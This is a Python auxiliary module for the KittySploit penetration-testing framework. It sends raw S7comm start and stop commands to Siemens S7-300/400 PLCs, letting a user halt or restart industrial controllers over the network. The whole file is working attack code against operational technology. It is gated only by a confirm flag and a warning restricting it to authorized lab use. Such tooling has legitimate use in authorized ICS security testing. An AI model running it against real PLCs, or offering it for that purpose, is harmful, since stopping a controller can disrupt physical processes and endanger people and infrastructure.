#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Siemens S7-300/400 PLC control.

Uses classic S7comm PIP _PROGRAM requests to start or stop S7-300 and S7-400 CPUs.
"""

from __future__ import annotations

from kittysploit import *
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.s7_300_client import S7_300Client, S7_300Command, is_s7_port_open


class Module(Auxiliary, Ics_scanner_client):
    __info__ = {
        "name": "Siemens S7-300/400 PLC control",
        "description": (
            "Sends raw S7comm CPU start/stop commands to Siemens S7-300 and S7-400 PLCs "
            "via the PIP _PROGRAM interface."
        ),
        "author": ["wenzhe zhu", "KittySploit Team"],
        "platform": Platform.OTHER,
        "tags": ["ics", "siemens", "s7comm", "s7-300", "s7-400", "plc", "ot"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["s7comm"], "S7comm port", True)
    slot = OptInteger(2, "CPU slot number in the ISO connect TSAP", False)
    command = OptChoice("stop", "PLC command", True, choices=["start", "stop"])
    confirm = OptBool(False, "Confirm intentional PLC state change", True)

    def _resolve_command(self) -> S7_300Command:
        action = str(self.command or "stop").strip().lower()
        if action == "start":
            return S7_300Command.START
        if action == "stop":
            return S7_300Command.STOP
        raise ValueError(f"unsupported command: {action}")

    def check(self):
        host = self._host()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not bool(self.confirm):
            return {
                "vulnerable": False,
                "reason": "set confirm=true to acknowledge PLC control",
                "confidence": "high",
            }
        if not is_s7_port_open(host, self._port(), self._timeout()):
            return {"vulnerable": False, "reason": f"TCP {self._port()} closed", "confidence": "high"}
        return {
            "vulnerable": True,
            "reason": "S7comm port open — S7-300/400 control may be possible",
            "confidence": "low",
        }

    def run(self):
        host = self._host()
        if not host:
            print_error("Target is required")
            return False
        if not bool(self.confirm):
            print_error("Refusing to control PLC without confirm=true")
            return False

        try:
            cmd = self._resolve_command()
        except ValueError as exc:
            print_error(str(exc))
            return False

        action = "START" if cmd == S7_300Command.START else "STOP"
        slot = int(self.slot or 2)

        print_warning(f"PLC {action} is disruptive — authorized OT lab use only")
        if not is_s7_port_open(host, self._port(), self._timeout()):
            print_error(f"Target {host}:{self._port()} is not reachable")
            return False

        print_success("Target S7comm port is open")
        print_status(
            f"Sending S7-300/400 {action} command to {host}:{self._port()} (slot {slot})..."
        )

        client = S7_300Client(host, self._port(), slot, self._timeout())
        try:
            client.run_command(cmd)
        except (OSError, RuntimeError, ValueError) as exc:
            print_error(f"S7-300/400 control failed: {exc}")
            return False

        print_success(f"S7-300/400 {action} command sent to {host}:{self._port()}")
        return True
